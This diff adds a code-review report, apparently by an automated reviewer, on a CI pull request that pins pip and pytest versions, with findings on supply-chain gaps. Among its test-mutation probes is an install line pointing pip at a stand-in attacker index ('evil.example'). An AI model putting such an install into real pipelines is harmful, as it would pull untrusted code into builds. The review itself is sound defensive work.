@@ -1,0 +1,26 @@
+# Reviewer C-450 (second, independent review; Lane 6): PR 291 @c13f2de (C-23, reviewer C-9), CI workflow change
+
+VERDICT: PASS WITH CONDITIONS on c13f2defd0a9131e9b0d651697da4889cf1bd609, the same verdict as the Lane 5 report of this card (`20261031-0300-reviewer-c450-pr291-ci-pip-pins.md`), reached independently; I read that report only after finishing mine. The workflow is valid, the pins exist and install, the whole tools suite is green on the merged tree; the two conditions are the same two: the claim "every CI install is constrained" is not true of the build backend, and the new test guards one step only. I add the exact spellings the test misses. The four `tests` jobs of the Actions run were still IN_PROGRESS when I finished; the three other jobs were SUCCESS.
+Nothing used docker (shim on PATH, never called); my install ran in a scratch venv outside the repository; bytecode off.
+
+## Checked (HIGH each)
+1. Diff: 3 files, +101 -6: `ci.yml` (only the "Install platform" step changed: 4 jobs x all other steps byte-identical to main, job list and the 3.11 to 3.14 matrix unchanged), `integration/ci-constraints.txt` (new, 4 exact pins), `tools/tests/test_ci_pip_pins_c23.py` (new). One commit on 7e8f16e; main is 3ee2e5d.
+2. YAML: loaded with the repository's strict duplicate-key loader (`test_yaml_duplicate_keys.load_strict`): OK; jobs `tests`, `compose-smoke`, `fly-image-smoke`, `compose-upgrade-smoke` = 7 jobs with the four matrix entries; the three non-test jobs are SUCCESS on the head.
+3. Pins exist and fit all four Pythons (PyPI JSON, requires_python and wheel names): `iniconfig==2.3.1` (py3-none-any, >=3.10), `packaging==26.3` (>=3.9), `pluggy==1.7.0` (>=3.10), `pytest==9.2.0` (>=3.10), `pip==26.2.2` (>=3.10, the current latest); none yanked. The step run verbatim in a clean Python 3.12.3 venv: install OK; `pytest 9.2.0`, `pluggy 1.7.0`, `iniconfig 2.3.1`, `packaging 26.3`, `fastapi 0.162.0`, `starlette 1.10.0`, `pydantic 2.14.1`, `uvicorn 0.54.0`, `httpx 0.28.1` resolved, i.e. the services' constraints and the new ones agree; `pip check` complains only that `claude-approver` lacks `anthropic` (same on main: that package is installed `--no-deps`, not this PR). I could only run 3.12 (the GX10 has no other Python); 3.11, 3.13 and 3.14 are CI's.
+4. Whole tools suite on main 3ee2e5d with the PR merged clean: 2818 passed, 4 skipped, 0 failed.
+5. Actions in the workflow are already pinned to commit SHAs (checkout and setup-python); the PR does not touch them.
+
+## What the test does and does not guard (vacuity probes, my script run against the shipped test functions on mutated workflow text)
+Caught: one of the shipped `pip install` lines without `$C`; `pip install ... \` continuation form; a pip upgrade or `-U`/`--upgrade`; the step renamed (the test raises, not vacuous); `$C` redefined as one file.
+MISSED (the install step still reports no problem): `python -m pip install requests` (any `python -m pip install <something else>` besides the pin), `pip3 install`, `true && pip install requests`, `$PIP install`, `uv pip install`, `pipx install`, a `pip install` whose only `$C` is in a trailing comment, `pip install $C --index-url http://evil.example/simple requests`, and `pip install $C git+https://.../x.git`. A new step in the tests job, or a new job, with an unconstrained `pip install requests`: MISSED (the test reads the "Install platform" step only). Fix: scan every `run` of every job and treat any `pip`/`python -m pip`/`pip3`/`uv` install as an install; refuse `--index-url`, `--extra-index-url`, `git+`, `-U`.
+
+## Supply-chain angle (what this does and does not guard)
+Does guard: the versions of pytest, pluggy, iniconfig, packaging and every package in `integration/constraints.txt` (the images' freeze), and pip itself, are fixed, so a newer release of any of those cannot enter a CI run; a CI test result is reproducible against those versions. Does NOT guard: (a) the build backend: all 17 editable installs build with `hatchling` fetched unpinned into pip's isolated build environment, outside `-c`; pip 26.2.2 has `--build-constraint <file>` (checked: it is in `pip install --help`) which the PR does not use (the Lane 5 report proved the effect: `-c` hatchling==1.25.0 still collected the latest); (b) any transitive dependency not in the two files floats (the freeze was taken on 3.12; packages only needed on 3.11, such as backports, are unpinned there); (c) a pin is a name and version, not a content hash: a file replaced at the index under the same name, or a compromised maintainer account before 2026-10-30 (the date the pins were taken), is trusted; `--require-hashes` is not used (the constraints file says so); (d) the index itself (PyPI over TLS) is trusted.
+
+## Findings
+- F-C450-S1 MEDIUM-LOW: pin the build backend: add `--build-constraint integration/build-constraints.txt` (hatchling and its dependencies, exact) to `$C`.
+- F-C450-S2 LOW: widen the test to every job and step and to the extra spellings above (each missed mutant must go red).
+- F-C450-S3 LOW: state in `ci-constraints.txt` that hashes are not enforced and the build backend floats until S1 lands.
+
+## What I did NOT do
+- Wait for the four unfinished `tests` jobs (CI is the coordinator's gate), run Python 3.11, 3.13 or 3.14, or run docker, merge or deploy.
